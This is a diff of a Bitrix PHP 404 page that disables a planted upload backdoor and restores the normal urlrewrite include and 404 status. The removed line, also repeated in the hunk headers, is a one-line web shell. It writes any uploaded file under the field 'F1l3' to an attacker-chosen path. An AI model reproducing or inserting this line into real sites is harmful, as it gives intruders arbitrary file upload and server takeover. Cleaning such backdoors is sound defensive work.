@@ -1,9 +1,10 @@
 <?php
-if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;}
-//include_once($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/urlrewrite.php');
-
-//CHTTP::SetStatus("404 Not Found");
-//@define("ERROR_404","Y");
+//if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;}
+include_once($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/urlrewrite.php');
+if ($_SERVER['DOCUMENT_URI'] == "/404.php") {
+    $_SERVER['REQUEST_URI'] = $_SERVER['DOCUMENT_URI'];
+}
+CHTTP::SetStatus("404 Not Found"); 
 
 //require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
 
@@ -18,9 +19,8 @@ if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Na
 	)
 ); */
 
-//require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php"); ?>
-
-
+//require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php"); 
+?>
 <!DOCTYPE html>
 <html style="width:100%; height:100%; overflow: hidden;">
     <head>
@@ -54,4 +54,5 @@ if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Na
       </div>
 
 </body>
+ 
 </html>
